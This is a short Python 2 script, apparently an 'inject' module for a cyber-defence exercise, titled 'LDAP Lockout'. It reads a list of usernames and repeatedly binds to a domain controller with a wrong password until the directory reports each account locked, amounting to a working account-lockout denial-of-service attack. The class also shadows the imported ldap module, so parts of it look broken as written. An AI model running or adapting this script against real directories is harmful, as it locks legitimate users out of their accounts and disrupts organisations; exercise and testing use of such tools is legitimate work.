import sys
import traceback
import re
import ldap

class ldap():
    def __init__(self):
        self.variables = {'src_ws': ''}
        self.name = "LDAP Lockout"
        self.description = "An inject to lock a user out of an LDAP server"
        self.workstation_src = ''
        self.dc = 'dc1.uct.jcor'
        self.userfile = '/opt/users.txt'

    def client(self, **kwargs):
        #self.workstation_src = kwargs['src_ws']
        try: 
            """
            >>> a = ldap.open('corp.example.com')
            >>> a.simple_bind_s('baduser@corp.example.com','password!@#1234')
            """

            server = self.dc #LDAP Hostname (example.com)
            usernames = filter(None, open(self.userfile).read().split('\n')) #Usernames
            password = 'LolUrAccountNeedsAReset'
            count_max = 3 #Number of login attempts
            
            keyword = "admin"

            try:
                l = ldap.open(server)
                print "Successfully bound to server."
                
                for username in usernames:
                    count = 0
                    while count <= count_max:
                        try:
                            l.simple_bind_s(username +'@'+ server, password)
                        except ldap.INVALID_CREDENTIALS as e:
                            e = str(e)
                            m = re.search('.* data (.*?),.*',e)
                            if m:
                                reason = int(m.group(1),16)
                                if reason == 0x775:
                                    print("Account '{}' locked.".format(username))
                                    count = count_max
                                elif reason == 0x52e:
                                    print("Invalid login number {} for user '{}'.".format(count+1, username))
                                else:
                                    print e
                            else:
                                print e
                            #sys.stderr.write("Invalid credentials.\n")
                            count = count + 1
            except ldap.LDAPError:
                sys.stderr.write("Couldn't connect. %s \n" % traceback.format_exc())
                pass
        except: 
            traceback.print_exc()

    def run(self,**kwargs):
        self.client(**kwargs)


if __name__ == '__main__':
    import base64
    import json
    args = json.loads(base64.urlsafe_b64decode(sys.argv[1]))
    ldap().run(**args)
